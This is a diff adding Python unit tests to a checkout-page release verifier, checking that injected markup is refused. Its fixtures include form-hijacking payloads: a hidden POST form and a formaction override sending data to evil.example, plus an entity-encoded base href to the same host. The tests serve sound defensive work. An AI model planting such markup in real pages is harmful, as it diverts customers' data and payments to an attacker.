@@ -699,6 +699,81 @@ class EmailFreeCheckoutReleaseTests(unittest.TestCase):
                 with self.assertRaisesRegex(RuntimeError, "LIVE_EMAIL_FIELD_PRESENT"):
                     release.verify_live_checkout_markup(html, 72)
 
+    def test_live_competing_post_form_refused_even_if_invoice_form_valid(self):
+        html = self._rendered_checkout(72) + (
+            b'<form method="post" action="https://evil.example/collect">'
+            b'<input name="contact" type="text"></form>')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_AMBIGUOUS:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_live_unrelated_get_search_form_allowed(self):
+        html = self._rendered_checkout(72) + (
+            b'<form method="get" action="/search/">Search</form>')
+        result = release.verify_live_checkout_markup(html, 72)
+        self.assertEqual(result["invoice_action"], "exact")
+
+    def test_live_formaction_override_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'<button type="submit">',
+            b'<button type="submit" formaction="https://evil.example/pay">')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_live_formmethod_override_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'<button type="submit">',
+            b'<button type="submit" formmethod="get">')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_live_encoded_base_destination_refused(self):
+        html = self._rendered_checkout(72) + (
+            b'<base href="https:&#47;&#47;evil.example/collect/">')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_template_self_base_refused_as_ambiguous(self):
+        clean = release.patch_template(template())
+        with self.assertRaisesRegex(RuntimeError, "FORM_CONTRACT_LOST"):
+            release.verify_template(clean + b'<base href="/store/">')
+
+    def test_live_duplicate_csrf_controls_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'</form>',
+            b'<input name="csrfmiddlewaretoken" type="hidden" value="' +
+            b'A' * 64 + b'"></form>')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_INVOICE_CONTRACT_INVALID:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_live_overlong_csrf_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'value="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01"',
+            b'value="' + b'A' * 128 + b'"')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_INVOICE_CONTRACT_INVALID:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_live_duplicate_input_name_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'name="csrfmiddlewaretoken"',
+            b'name="csrfmiddlewaretoken" name="different"')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_template_second_post_form_refused(self):
+        clean = release.patch_template(template())
+        with self.assertRaisesRegex(RuntimeError, "FORM_CONTRACT_LOST"):
+            release.verify_template(
+                clean + b'<form method="post" action="/different/"></form>')
+
+    def test_template_duplicate_csrf_refused(self):
+        clean = release.patch_template(template())
+        duplicate = clean.replace(
+            b'{% csrf_token %}',
+            b'{% csrf_token %}<input name="csrfmiddlewaretoken" '
+            b'type="hidden" value="ABC">')
+        with self.assertRaisesRegex(RuntimeError, "FORM_CONTRACT_LOST"):
+            release.verify_template(duplicate)
+
     def test_live_atelier_missing_csrf_is_a_release_block(self):
         html = self._rendered_checkout(879)
         html = html.replace(
